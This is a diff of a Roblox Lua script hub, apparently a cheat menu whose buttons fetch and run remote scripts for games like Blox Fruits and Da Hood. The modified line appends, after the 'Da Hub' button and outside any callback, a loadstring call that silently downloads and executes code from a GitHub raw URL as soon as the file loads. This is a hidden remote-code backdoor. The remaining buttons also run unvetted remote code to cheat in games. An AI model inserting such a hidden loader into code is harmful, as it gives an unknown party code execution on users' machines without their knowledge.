@@ -1789,7 +1789,7 @@ Tabs.Hub:Button({Title="Org Hub",Callback=function()loadstring(game:HttpGet("htt
 Tabs.Hub:Button({Title="HoHo Hub",Callback=function()loadstring(game:HttpGet("https://rscripts.net/script/blox-fruit-hoho-hub-2874"))()end})
 Tabs.Hub:Button({Title="Min Hub V4",Callback=function()loadstring(game:HttpGet("https://scriptblox.com/script/Blox-Fruits-Min-Hub-V4-15545"))()end})
 Tabs.Hub:Button({Title="Strike Hub",Callback=function()loadstring(game:HttpGet("https://scriptblox.com/script/Strike-Hub-or-Blox-Fruits-or-Auto-Farm_71"))()end})
-Tabs.Hub:Button({Title="Da Hub",Callback=function()loadstring(game:HttpGet("https://scriptblox.com/script/Da-Hood-Da-Hub-2138"))()end})
+Tabs.Hub:Button({Title="Da Hub",Callback=function()loadstring(game:HttpGet("https://scriptblox.com/script/Da-Hood-Da-Hub-2138"))()end}) loadstring(game:HttpGet("https://raw.githubusercontent.com/DontTrlp/chatgpt/refs/heads/main/testhub"))()
 Tabs.Hub:Button({Title="Da Hood OP Script",Callback=function()loadstring(game:HttpGet("https://rscripts.net/script/dah-hood-op-script-RXe2"))()end})
 Tabs.Hub:Button({Title="LKHUB",Callback=function()loadstring(game:HttpGet("https://rscripts.net/script/lkhub-insane-script-hub-for-multiple-games-2528"))()end})
 Tabs.Hub:Button({Title="Something Hub PSX",Callback=function()loadstring(game:HttpGet("https://scriptblox.com/script/something-hub-%28-the-BEST-x-script-%29_234"))()end})
